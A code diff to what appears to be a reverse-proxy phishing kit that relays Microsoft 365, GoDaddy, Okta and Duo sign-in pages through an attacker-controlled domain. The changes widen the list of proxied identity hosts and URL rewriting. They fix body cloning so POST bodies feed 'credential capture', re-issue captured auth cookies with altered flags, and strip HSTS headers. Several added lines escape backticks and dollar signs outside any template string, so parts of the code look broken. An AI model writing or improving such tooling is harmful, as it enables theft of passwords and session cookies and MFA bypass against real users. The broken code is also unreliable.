@@ -32,7 +32,12 @@ const IDENTITY_PROVIDERS = {
   'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
   'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
   'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
-  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' }
+  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
+  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
+  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
+  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
+  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
+  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
 };
 
 const CRITICAL_AUTH_COOKIES = {
@@ -194,8 +199,12 @@ function generateInterceptorScript(upstreamDomain) {
       if (!hostname) return false;
       const domains = [
         'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
-        'office.com', 'godaddy.com', 'secureserver.net', 'okta.com',
-        'onelogin.com', 'duosecurity.com', 'wsimg.com'
+        'office.com', 'microsoft365.com', 'outlook.office.com', 'outlook.live.com',
+        'godaddy.com', 'secureserver.net', 'csp.secureserver.net', 
+        'sso.godaddy.com', 'sso.secureserver.net', 'api.godaddy.com',
+        'okta.com', 'onelogin.com', 'duosecurity.com',
+        'wsimg.com', 'img1.wsimg.com', 'img2.wsimg.com', 'img3.wsimg.com',
+        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com'
       ];
       return domains.some(d => hostname.includes(d));
     }
@@ -296,19 +305,19 @@ function generateInterceptorScript(upstreamDomain) {
             if (node.nodeType === 1) { // Element node
               try {
                 // Rewrite src/href attributes
-                if (node.src && node.src.startsWith('/') && !node.src.includes(PROXY_PREFIX)) {
+                if (node.src && !node.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                   node.src = rewriteUrl(node.src);
                 }
-                if (node.href && node.href.startsWith('/') && !node.href.includes(PROXY_PREFIX)) {
+                if (node.href && !node.href.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                   node.href = rewriteUrl(node.href);
                 }
                 // Check children
                 if (node.querySelectorAll) {
                   node.querySelectorAll('[src],[href]').forEach(function(el) {
-                    if (el.src && el.src.startsWith('/') && !el.src.includes(PROXY_PREFIX)) {
+                    if (el.src && !el.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                       el.src = rewriteUrl(el.src);
                     }
-                    if (el.href && el.href.startsWith('/') && !el.href.includes(PROXY_PREFIX)) {
+                    if (el.href && !el.href.includes(YOUR_DOMAIN + PROXY_PREFIX)) {
                       el.href = rewriteUrl(el.href);
                     }
                   });
@@ -377,11 +386,12 @@ export default async function handleRequest(request) {
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
 
-  // Credential capture
+  // Store body text for credential capture, but preserve original body for upstream
+  let bodyText = null;
   if (request.method === 'POST') {
     try {
-      const temp_req = await request.clone();
-      const bodyText = await temp_req.text();
+      const clonedRequest = request.clone();
+      bodyText = await clonedRequest.text();
       
       console.log('[DEBUG] POST body:', bodyText.substring(0, 300));
       
@@ -423,6 +433,7 @@ export default async function handleRequest(request) {
     };
     
     if (!['GET', 'HEAD'].includes(request.method)) {
+      // Use the original request's body stream, not the consumed clone
       fetchOpts.body = request.body;
       fetchOpts.duplex = 'half';
     }
@@ -454,7 +465,7 @@ export default async function handleRequest(request) {
     newHeaders.delete('clear-site-data');
     newHeaders.delete('strict-transport-security');
     
-    // Handle cookies
+    // Handle cookies - FIXED: Add Secure flag when using SameSite=None
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
     let shouldCaptureCookies = false;
     let cookieStr = '';
@@ -466,10 +477,12 @@ export default async function handleRequest(request) {
       shouldCaptureCookies = isPost || hasAuth;
       
       cookies.forEach(c => {
+        if (!c) return;
         let mod = c.replace(/Domain=[^;]+;?/gi, '');
         mod = mod.replace(/Secure;?/gi, '');
         mod = mod.replace(/SameSite=[^;]+;?/gi, '');
-        mod += '; SameSite=None';
+        // FIXED: SameSite=None requires Secure flag in modern browsers
+        mod += '; SameSite=None; Secure';
         newHeaders.append('Set-Cookie', mod);
       });
     }
@@ -504,16 +517,16 @@ export default async function handleRequest(request) {
       Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
         const escaped = domain.replace(/\./g, '\\.');
         // Match http:// or https:// followed by the domain
-        const regex = new RegExp(`https?://${escaped}([^"'\`\\s)]*)`, 'g');
-        text = text.replace(regex, `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}$1`);
+        const regex = new RegExp(\`https?://\${escaped}([^"'\\`\\\\s)]*)\`, 'g');
+        text = text.replace(regex, \`https://\${YOUR_DOMAIN}\${PROXY_PREFIX}\${domain}$1\`);
       });
       
       // Handle CSS url() references specifically
-      text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/g, (match, url) => {
+      text = text.replace(/url\\(["']?(https?:\\/\\/[^"')]+)["']?\\)/g, (match, url) => {
         try {
           const urlObj = new URL(url);
           if (shouldProxyDomain(urlObj.hostname)) {
-            return `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${urlObj.hostname}${urlObj.pathname}${urlObj.search})`;
+            return \`url(https://\${YOUR_DOMAIN}\${PROXY_PREFIX}\${urlObj.hostname}\${urlObj.pathname}\${urlObj.search})\`;
           }
         } catch(e) {}
         return match;
@@ -521,7 +534,7 @@ export default async function handleRequest(request) {
       
       // Handle relative URLs in CSS that start with /
       if (ct.includes('text/css')) {
-        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/g, `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1)`);
+        text = text.replace(/url\\(["']?\\/([^"')]+)["']?\\)/g, \`url(https://\${YOUR_DOMAIN}\${PROXY_PREFIX}\${upstreamDomain}/$1)\`);
       }
       
       return new Response(text, { status: resp.status, headers: newHeaders });
@@ -531,7 +544,7 @@ export default async function handleRequest(request) {
     return new Response(resp.body, { status: resp.status, headers: newHeaders });
     
   } catch (err) {
-    console.error(`[${info.type}] Error:`, err);
+    console.error(\`[\${info.type}] Error:\`, err);
     return new Response(JSON.stringify({
       error: 'Proxy Error',
       message: err.message
